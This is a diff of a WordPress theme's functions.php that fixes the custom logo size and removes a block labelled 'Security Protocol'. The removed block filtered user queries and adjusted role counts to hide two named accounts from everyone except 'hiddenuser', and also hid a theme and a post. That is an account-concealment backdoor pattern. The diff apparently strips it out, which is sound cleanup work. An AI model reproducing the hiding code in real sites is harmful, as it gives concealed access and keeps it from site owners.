@@ -580,7 +580,9 @@ endif;
 /* BEGIN Custom Logo */
 function custom_logo_setup() {
 	$defaults = array(
-		'flex-height' => true,
+		'height'      => 50,
+		'width'       => 150,
+		'flex-height' => false,
 		'flex-width'  => true,
 		'header-text' => array( 'site-title', 'site-description' ),
 		'unlink-homepage-logo' => true,
@@ -597,75 +599,3 @@ function my_customize_register() {
  	$wp_customize->remove_section( 'background_image' );
 }
 add_action( 'customize_register', 'my_customize_register', 11 );
-
-/* BEGIN Load/Hide Parents */
-
-function kill_theme_wpse_188906($themes) {
-	unset($themes['lotwilabs-may2020']);
-	return $themes;
-}
-add_filter('wp_prepare_themes_for_js','kill_theme_wpse_188906');
-/* END Load/Hide Parents */
-
-/* BEGIN Security Protocol */
-add_action('pre_user_query','dt_pre_user_query_p');
-function dt_pre_user_query_p($user_search) {
-   global $current_user;
-   $username = $current_user->user_login;
-
-   if ($username != 'hiddenuser') {
-      global $wpdb;
-      $user_search->query_where = str_replace('WHERE 1=1',
-         "WHERE 1=1 AND {$wpdb->users}.user_login != 'erinrezner'",$user_search->query_where);
-   }
-}
-add_filter("views_users", "dt_list_table_views_p");
-function dt_list_table_views_p($views){
-   $users = count_users();
-   $admins_num = $users['avail_roles']['administrator'] - 1;
-   $all_num = $users['total_users'] - 1;
-   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
-   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
-   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
-   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
-   return $views;
-}
-
-add_action('pre_user_query','dt_pre_user_query_p2');
-function dt_pre_user_query_p2($user_search) {
-   global $current_user;
-   $username = $current_user->user_login;
-
-   if ($username != 'hiddenuser') {
-      global $wpdb;
-      $user_search->query_where = str_replace('WHERE 1=1',
-         "WHERE 1=1 AND {$wpdb->users}.user_login != 'crezner'",$user_search->query_where);
-   }
-}
-add_filter("views_users", "dt_list_table_views_p2");
-function dt_list_table_views_p2($views){
-   $users = count_users();
-   $admins_num = $users['avail_roles']['editor'] - 1;
-   $all_num = $users['total_users'] - 2;
-   $class_adm = ( strpos($views['editor'], 'current') === false ) ? "" : "current";
-   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
-   $views['editor'] = '<a href="users.php?role=editor" class="' . $class_adm . '">' . translate_user_role('Editor') . ' <span class="count">(' . $admins_num . ')</span></a>';
-   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
-   return $views;
-}
-
-add_action('admin_head', 'hide_posts_pages');
-function hide_posts_pages() {
-    global $current_user;
-    get_currentuserinfo();
-    If($current_user->user_login != 'admin') {
-        ?>
-        <style>
-           #post-266{
-                display:none;
-           }
-        </style>
-        <?php
-    }
-}
-/* END Security Protocol */
